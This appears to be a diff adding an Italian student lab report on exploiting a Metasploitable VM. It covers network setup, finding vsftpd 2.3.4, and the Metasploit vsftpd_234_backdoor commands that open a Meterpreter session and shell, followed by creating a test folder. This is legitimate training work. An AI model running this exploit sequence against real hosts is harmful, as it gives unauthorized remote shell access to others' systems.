@@ -1,0 +1,65 @@
+# Report Attività di Hacking: Metasploitable
+
+## 1. Configurazione Iniziale
+
+Per conformarsi ai requisiti dell'esercizio, è stata modificata la configurazione di rete di entrambe le macchine virtuali per operare sulla stessa sottorete.
+
+* **Metasploitable:** IP impostato a `192.168.1.149/24`
+* **Kali Linux (Attaccante):** IP impostato a `192.168.1.100/24`
+
+Ecco i comandi utilizzati per modificare gli indirizzi IP durante l'esercizio:
+
+### Modifica IP su Metasploitable (Permanente tramite file di configurazione)
+
+Il comando per modificare la configurazione di rete è stato:
+
+* `sudo nano /etc/network/interfaces`
+
+Dopo aver modificato il file impostando `address 192.168.1.149`, le modifiche sono state applicate riavviando il servizio di rete o la macchina:
+
+* `sudo /etc/init.d/networking restart`
+
+### Modifica IP su Kali Linux (Temporaneo tramite riga di comando)
+
+Per assegnare l'IP alla macchina Kali (`192.168.1.100`), sono stati utilizzati i seguenti comandi:
+
+* `sudo ip addr add 192.168.1.100/24 dev eth0` (per assegnare l'indirizzo IP)
+
+
+* `sudo ip link set eth0 up` (per attivare l'interfaccia)
+
+
+La connettività è stata verificata tramite il comando `ping 192.168.1.149`.
+
+## 2. Enumerazione Servizi
+
+L'attività di enumerazione ha confermato la presenza del servizio vulnerabile sulla macchina target:
+
+* **Servizio:** `vsftpd 2.3.4`
+* **Porta:** `21/tcp`
+
+## 3. Esecuzione dell'Attacco (Metasploit)
+
+L'attacco è stato condotto utilizzando il framework Metasploit con i seguenti comandi:
+
+1. `msfconsole`
+2. `use exploit/unix/ftp/vsftpd_234_backdoor`
+3. `set RHOSTS 192.168.1.149`
+4. `set LHOST 192.168.1.100`
+5. `exploit`
+
+L'exploit è andato a buon fine, confermato dal messaggio: `Meterpreter session 1 opened`.
+
+## 4. Attività Post-Exploitation
+
+Ottenuto l'accesso, è stata aperta una shell di sistema per eseguire il compito richiesto:
+
+1. `shell`
+2. `cd /`
+3. `mkdir test_metasploit`
+
+La creazione della cartella è stata verificata con successo tramite il comando `ls -l /`.
+
+## 5. Conclusione
+
+L'esercizio è stato completato correttamente. La sessione Meterpreter è stata chiusa e l'accesso remoto è stato terminato.
